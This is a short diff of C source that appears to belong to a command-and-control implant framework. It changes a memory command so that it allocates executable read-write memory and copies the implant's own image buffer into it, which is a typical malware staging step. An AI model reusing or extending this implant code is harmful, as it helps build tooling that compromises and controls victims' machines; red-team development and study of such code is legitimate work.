@@ -81,18 +81,18 @@ FUNC VOID CommandDispatcher(
 FUNC VOID CommandMemory( 
     _In_ PPARSER Parser    
 ) {
+    BLACKOUT_INSTANCE
+
     PVOID BaseAddr = NULL;
     DWORD AddrSize = 0x2000;
     DWORD ErrCode  = 0;
 
     ErrCode = bkMemAlloc( NtCurrentProcess(), &BaseAddr, AddrSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
 
-    BK_PRINT( "[I] mem allocated @ 0x%p\n", BaseAddr );
+    ErrCode = bkMemWrite( NtCurrentProcess(), BaseAddr, Instance()->Base.Buffer, 0x1000 );
 
-    BK_PRINT( "[!] failed with err: %d\n", ErrCode );
-
-    if ( ErrCode != 0 )
-        PackageTransmitError( ErrCode );
+    BK_PRINT( "[I] Base Addr @ 0x%p\n", BaseAddr );
+    BK_PRINT( "[!] Error code: %d\n", ErrCode );
 }
 
 FUNC VOID CommandRun(
